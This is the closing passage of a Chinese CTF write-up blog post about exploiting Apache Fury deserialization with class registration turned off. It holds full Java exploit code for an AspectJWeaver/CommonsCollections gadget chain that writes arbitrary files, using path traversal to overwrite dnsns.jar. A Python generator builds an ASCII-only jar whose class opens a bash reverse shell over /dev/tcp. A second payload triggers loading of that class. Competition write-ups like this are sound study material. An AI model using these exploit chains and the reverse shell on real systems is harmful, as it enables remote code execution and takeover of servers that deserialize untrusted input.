+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] decoded = Base64.getDecoder().decode(v.getValue());</span><br><span class="line">decodedStr = <span class="keyword">new</span> <span class="title class_">String</span>(decoded, StandardCharsets.UTF_8);</span><br><span class="line"><span class="type">Fury</span> <span class="variable">fury</span> <span class="operator">=</span> Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(<span class="literal">false</span>).build();</span><br><span class="line"><span class="comment">//允许不预先注册类的情况下进行反序列化</span></span><br><span class="line">fury.deserialize(decoded);</span><br></pre></td></tr></table></figure>
+
+<p>并且在furry&#x2F;disallowed.txt存在反序列化黑名单，反序列化时会检查类是否在黑名单中</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202602271717520.png" alt="image-20260208164258171"></p>
+<p>(黑名单太长就不贴了)</p>
+<p>从依赖中可以发现存在AspectJWeaver依赖和CC依赖，并且以下类是不在黑名单中的</p>
+<ul>
+<li><code>org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap</code></li>
+<li><code>org.apache.commons.collections.map.LazyMap</code></li>
+<li><code>org.apache.commons.collections.keyvalue.TiedMapEntry</code></li>
+<li><code>org.apache.commons.collections.comparators.TransformingComparator</code></li>
+<li><code>org.apache.commons.collections.functors.ConstantFactory</code></li>
+<li><code>org.apache.commons.collections.functors.StringValueTransformer</code></li>
+</ul>
+<p>正好yso中的AspectJWeaver写文件链子同时也需要cc依赖，参考 <a target="_blank" rel="noopener" href="https://meizjm3i.github.io/2021/03/07/Servlet%E4%B8%AD%E7%9A%84%E6%97%B6%E9%97%B4%E7%AB%9E%E4%BA%89%E4%BB%A5%E5%8F%8AAsjpectJWeaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget%E6%9E%84%E9%80%A0-AntCTFxD-3CTF-non-RCE%E9%A2%98%E8%A7%A3/">Servlet中的时间竞争及AspectJWeaver反序列化Gadget构造[non-RCE 题解]</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">    HashMap.put()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            TiedMapEntry.hashCode()</span><br><span class="line">                TiedMapEntry.getValue()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        SimpleCache$StorableCachingMap.put()</span><br><span class="line">                            SimpleCache$StorableCachingMap.writeToPath()</span><br><span class="line">                                FileOutputStream.write()</span><br></pre></td></tr></table></figure>
+
+<p>我们可以使用这条链子来任意写文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.StringValueTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.fury.Fury;</span><br><span class="line"><span class="keyword">import</span> org.apache.fury.config.Language;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AspectJWeaverExp</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// Goal: Arbitrary File Write</span></span><br><span class="line">        <span class="comment">// Chain:</span></span><br><span class="line">        <span class="comment">// PriorityQueue.readObject() -&gt; heapify() -&gt; comparator.compare()</span></span><br><span class="line">        <span class="comment">// comparator = TransformingComparator(StringValueTransformer)</span></span><br><span class="line">        <span class="comment">// transformer.transform(TiedMapEntry) -&gt; TiedMapEntry.toString()</span></span><br><span class="line">        <span class="comment">// TiedMapEntry.toString() -&gt; getValue() -&gt; map.get(key)</span></span><br><span class="line">        <span class="comment">// map = LazyMap(StoreableCachingMap, ConstantFactory(bytes))</span></span><br><span class="line">        <span class="comment">// LazyMap.get(key) -&gt; factory.create(key) -&gt; bytes</span></span><br><span class="line">        <span class="comment">// LazyMap.put(key, bytes) -&gt; StoreableCachingMap.put(key, bytes) -&gt; write bytes to file &#x27;key&#x27;</span></span><br><span class="line">        <span class="type">byte</span>[] content = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CTF_Challenge\\阿里CTF 2026\\Fileury\\FileuryExp\\ascii01_3.jar&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;../../../../../../../../../usr/local/openjdk-8/jre/lib/ext/dnsns.jar&quot;</span>;</span><br><span class="line"><span class="comment">//        byte[] content = cronPayload.getBytes();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. Setup StoreableCachingMap (The Inner Map)</span></span><br><span class="line">        <span class="comment">// Ensure access to the class</span></span><br><span class="line">        Class&lt;?&gt; scMapClass = Class.forName(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = scMapClass.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// folder = &quot;.&quot;, maxEntries = 100</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">storeableMap</span> <span class="operator">=</span> (Map) constructor.newInstance(<span class="string">&quot;.&quot;</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. Setup LazyMap with ConstantFactory</span></span><br><span class="line">        <span class="type">ConstantFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantFactory</span>(content);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(storeableMap, factory);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. Setup TiedMapEntry</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, filename);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. Setup Comparator and Transformer</span></span><br><span class="line">        <span class="comment">// StringValueTransformer calls String.valueOf(obj) which calls obj.toString() (if not null)</span></span><br><span class="line">        org.apache.commons.collections.<span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> StringValueTransformer.getInstance();</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. Setup PriorityQueue</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">sizeField</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        sizeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        sizeField.set(queue, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">queueField</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] queueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">2</span>];</span><br><span class="line">        queueArray[<span class="number">0</span>] = entry;</span><br><span class="line">        queueArray[<span class="number">1</span>] = entry;</span><br><span class="line">        queueField.set(queue, queueArray);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. Serialize with Fury</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Serializing AspectJ Chain with Fury...&quot;</span>);</span><br><span class="line">        <span class="type">Fury</span> <span class="variable">fury</span> <span class="operator">=</span> Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(<span class="literal">false</span>).build();</span><br><span class="line">        <span class="type">byte</span>[] serializedInfo = fury.serialize(queue);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">b64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(serializedInfo);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload_aj.b64&quot;</span>);</span><br><span class="line">        fos.write(b64.getBytes());</span><br><span class="line">        fos.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;AspectJ Payload saved to payload_aj.b64&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Payload Base64: &quot;</span> + b64);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>至于为什么写dnsns.jar，参考<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9e0V4bnV6fuGAfO1AKLYdw">Fastjson write ascii JAR RCE</a></p>
+<blockquote>
+<p>当使用-verbose:class参数时，可以监控类的加载情况</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202602271717810.png" alt="image-20260208230332390"></p>
+<p>在这里dnsns.jar仍然未被加载，所以直接覆盖dnsns.jar</p>
+</blockquote>
+<p>其实只要是未加载的jar包就行</p>
+<p>生成jar包的脚本,具体参考<a target="_blank" rel="noopener" href="https://github.com/c0ny1/ascii-jar">https://github.com/c0ny1/ascii-jar</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> compress <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">allow_bytes = []</span><br><span class="line">disallowed_bytes = [<span class="number">38</span>, <span class="number">60</span>, <span class="number">39</span>, <span class="number">62</span>, <span class="number">34</span>, <span class="number">40</span>, <span class="number">41</span>]</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span> b <span class="keyword">in</span> disallowed_bytes:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    allow_bytes.append(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    padding_char = <span class="string">&#x27;U&#x27;</span></span><br><span class="line">    raw_filename = <span class="string">&#x27;DNSNameServiceDescriptor.class&#x27;</span></span><br><span class="line">    zip_entity_filename = <span class="string">&#x27;sun/net/spi/nameservice/dns/DNSNameServiceDescriptor.class&#x27;</span></span><br><span class="line">    jar_filename = <span class="string">&#x27;ascii01_3.jar&#x27;</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        javaCode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">package sun.net.spi.nameservice.dns;</span></span><br><span class="line"><span class="string">import sun.net.spi.nameservice.NameService;</span></span><br><span class="line"><span class="string">import sun.net.spi.nameservice.NameServiceDescriptor;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">import java.io.IOException;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">public final class DNSNameServiceDescriptor extends Exception implements NameServiceDescriptor &#123;</span></span><br><span class="line"><span class="string">    private static final String paddingData = &quot;&#123;PADDING_DATA&#125;&quot;;</span></span><br><span class="line"><span class="string">    public DNSNameServiceDescriptor() &#123;</span></span><br><span class="line"><span class="string">        try &#123;</span></span><br><span class="line"><span class="string">            String[] cmd = new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/ip/9000 0&gt;&amp;1&quot;&#125;;</span></span><br><span class="line"><span class="string">            Runtime.getRuntime().exec(cmd);</span></span><br><span class="line"><span class="string">        &#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="string">            e.printStackTrace();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    public NameService createNameService() throws Exception &#123;</span></span><br><span class="line"><span class="string">        return null;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    public String getProviderName() &#123;</span></span><br><span class="line"><span class="string">        return &quot;sun&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    public String getType() &#123;</span></span><br><span class="line"><span class="string">        return &quot;dns&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        padding_data = padding_char * num</span><br><span class="line">        javaCode = javaCode.replace(<span class="string">&quot;&#123;PADDING_DATA&#125;&quot;</span>, padding_data)</span><br><span class="line"></span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&#x27;DNSNameServiceDescriptor.java&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        f.write(javaCode)</span><br><span class="line">        f.close()</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">        os.system(<span class="string">&quot;D:\\JavaEnviron\\jdk1.8.0_65\\bin\\javac.exe -nowarn -g:none -source 1.8 -target 1.8 -cp jasper.jar DNSNameServiceDescriptor.java&quot;</span>)</span><br><span class="line"></span><br><span class="line">        raw_data = <span class="built_in">bytearray</span>(<span class="built_in">open</span>(raw_filename, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">        compressor = ASCIICompressor(<span class="built_in">bytearray</span>(allow_bytes))</span><br><span class="line">        compressed_data = compressor.compress(raw_data)[<span class="number">0</span>]</span><br><span class="line">        crc = zlib.crc32(raw_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">        st_crc = struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, crc)</span><br><span class="line">        st_raw_data = struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(raw_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>))</span><br><span class="line">        st_compressed_data = struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(compressed_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>))</span><br><span class="line">        st_cdzf = struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(compressed_data) + <span class="built_in">len</span>(zip_entity_filename) + <span class="number">0x1e</span>)</span><br><span class="line"></span><br><span class="line">        b_crc = isAllowBytes(st_crc, allow_bytes)</span><br><span class="line">        b_raw_data = isAllowBytes(st_raw_data, allow_bytes)</span><br><span class="line">        b_compressed_data = isAllowBytes(st_compressed_data, allow_bytes)</span><br><span class="line">        b_cdzf = isAllowBytes(st_cdzf, allow_bytes)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> b_crc <span class="keyword">and</span> b_raw_data <span class="keyword">and</span> b_compressed_data <span class="keyword">and</span> b_cdzf:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] CRC:&#123;0&#125; RDL:&#123;1&#125; CDL:&#123;2&#125; CDAFL:&#123;3&#125; Padding data: &#123;4&#125;*&#123;5&#125;&#x27;</span>.<span class="built_in">format</span>(b_crc, b_raw_data, b_compressed_data, b_cdzf, num, padding_char))</span><br><span class="line">            output = <span class="built_in">open</span>(jar_filename, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            output.write(wrap_jar(raw_data, compressed_data, zip_entity_filename.encode()))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Generate &#123;0&#125; success&#x27;</span>.<span class="built_in">format</span>(jar_filename))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] CRC:&#123;0&#125; RDL:&#123;1&#125; CDL:&#123;2&#125; CDAFL:&#123;3&#125; Padding data: &#123;4&#125;*&#123;5&#125;&#x27;</span>.<span class="built_in">format</span>(b_crc, b_raw_data, b_compressed_data, b_cdzf, num, padding_char))</span><br><span class="line">        num = num + <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>上传完jar包后直接通过反序列化触发dnsns.jar加载</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.fury.Fury;</span><br><span class="line"><span class="keyword">import</span> org.apache.fury.config.Language;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExpFinal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Generating payload to load sun.net.spi.nameservice.dns.DNSNameServiceDescriptor...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Fury</span> <span class="variable">fury</span> <span class="operator">=</span> Fury.builder()</span><br><span class="line">                .withLanguage(Language.JAVA)</span><br><span class="line">                .requireClassRegistration(<span class="literal">false</span>)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.net.spi.nameservice.dns.DNSNameServiceDescriptor&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> clazz.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payload = fury.serialize(instance);</span><br><span class="line">        <span class="type">String</span> <span class="variable">b64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(payload);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload_dns.b64&quot;</span>)) &#123;</span><br><span class="line">            fos.write(b64.getBytes());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Payload saved to payload_dns.b64&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Payload Base64: &quot;</span> + b64);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>两次发包，首先覆盖dnsns.jar</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202602271717737.png" alt="image-20260208230911857"></p>
+<p>然后触发加载，反弹shell</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202602271717634.png" alt="image-20260208230938967"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202602271717547.png" alt="image-20260208225455127"></p>
+
+  </div>
+
+  
+  <div class="about">
+    <h1>About this Post</h1>
+    <div class="details">
+      <p>This post is written by p0l1st, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+    
+    <p class="tags">
+      <i class="bi bi-tags icon"></i>
+      
+      <a href="/tags/CTF/" class="tag">#CTF</a>
+      
+    </p>
+    
+  </div>
+  
+
+  <div class="container post-prev-next">
+    <a class="next"></a>
+    
+    <a href="/2025/10/27/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812025%E5%88%9D%E8%B5%9B-Web-Writeup/" class="prev">
+      <div class="text">
+        <p class="label">Previous</p>
+        <h3 class="title">强网拟态2025初赛 Web Writeup</h3>
+      </div>
+    </a>
+    
+  </div>
+
+  
+    
+    
+  
+</article>
+
+
+    </main>
+    <footer>
+  <div class="inner">
+    <div class="links">
+      
+      <div class="group">
+        <h2 class="title">Blog</h2>
+        
+        <a href="/" class="item">Home</a>
+        
+        <a href="/archives" class="item">Archives</a>
+        
+        <a href="/tags" class="item">Tags</a>
+        
+        <a href="/categories" class="item">Categories</a>
+        
+        <a href="/search" class="item">Search</a>
+        
+        <a href="/friends" class="item">Friends</a>
+        
+        <a href="/about" class="item">About</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Me</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/p0l1st" class="item">GitHub</a>
+        
+        <a target="_blank" rel="noopener" href="https://yuque.com/p0l1st" class="item">语雀</a>
+        
+      </div>
+      
+    </div>
+    <span>&copy; 2026 p0l1st<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+    
+    
+      <br>
+      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+        <label>
+          <input type="radio" value="light">
+          <span>Light</span>
+        </label>
+        <label>
+          <input type="radio" value="dark">
+          <span>Dark</span>
+        </label>
+        <label>
+          <input type="radio" value="auto">
+          <span>Auto</span>
+        </label>
+      </div>
+    
+  </div>
+</footer>
+
+
+    
+<script src="/js/main.js"></script>
+
+
+    
+
+    
+    
+<script src="/js/scroll-reveal.js"></script>
+
+    
+
+    
+
+    
+
+    
+  </body>
+</html>
